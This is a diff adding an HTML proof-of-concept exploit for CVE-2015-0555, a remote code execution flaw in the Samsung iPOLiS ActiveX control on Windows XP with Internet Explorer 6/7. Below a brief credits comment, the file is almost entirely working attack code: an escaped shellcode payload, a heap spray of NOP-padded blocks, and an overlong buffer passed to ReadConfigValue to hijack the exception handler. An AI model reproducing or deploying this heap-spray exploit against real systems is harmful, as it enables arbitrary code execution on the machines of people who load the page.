@@ -1,0 +1,39 @@
+<html>
+<!--
+Vendor Homepage: https://www.samsung-security.com/Tools/device-manager.aspx
+Samsung iPOLiS 1.12.2 ReadConfigValue Remote Code Execution (heap spray)
+CVE: 2015-0555
+Author: Praveen Darshanam
+http://blog.disects.com/2015/02/samsung-ipolis-1122-xnssdkdeviceipinsta.html
+http://darshanams.blogspot.com/
+Tested on Windows XP SP3 IE6/7
+Thanks to Peter Van Eeckhoutte for his wonderfull exploit writing tutorials
+-->
+<object classid='clsid:D3B78638-78BA-4587-88FE-0537A0825A72' id='target'> </object>
+<script>
+
+var shellcode = unescape('%ue8fc%u0082%u0000%u8960%u31e5%u64c0%u508b%u8b30%u0c52%u528b%u8b14%u2872%ub70f%u264a%uff31%u3cac%u7c61%u2c02%uc120%u0dcf%uc701%uf2e2%u5752%u528b%u8b10%u3c4a%u4c8b%u7811%u48e3%ud101%u8b51%u2059%ud301%u498b%ue318%u493a%u348b%u018b%u31d6%uacff%ucfc1%u010d%u38c7%u75e0%u03f6%uf87d%u7d3b%u7524%u58e4%u588b%u0124%u66d3%u0c8b%u8b4b%u1c58%ud301%u048b%u018b%u89d0%u2444%u5b24%u615b%u5a59%uff51%u5fe0%u5a5f%u128b%u8deb%u6a5d%u8d01%ub285%u0000%u5000%u3168%u6f8b%uff87%ubbd5%ub5f0%u56a2%ua668%ubd95%uff9d%u3cd5%u7c06%u800a%ue0fb%u0575%u47bb%u7213%u6a6f%u5300%ud5ff%u6163%u636c%u4100');
+var bigblock = unescape('%u9090%u9090');
+var headersize = 20;
+var slackspace = headersize + shellcode.length;
+while (bigblock.length < slackspace) bigblock += bigblock;
+
+var fillblock = bigblock.substring(0,slackspace);
+var block = bigblock.substring(0,bigblock.length - slackspace);
+while (block.length + slackspace < 0x40000) block = block + block + fillblock;
+
+var memory = new Array();
+for (i = 0; i < 500; i++){ memory[i] = block + shellcode }
+
+// SEH and nSEH will point to 0x06060606
+// 0x06060606 will point to (nops+shellcode) chunk
+var hbuff = "";
+for (i = 0; i <5000; i++)
+{
+	hbuff += "\x06";
+}
+
+// trigget crash
+target.ReadConfigValue(hbuff);
+</script>
+</html>
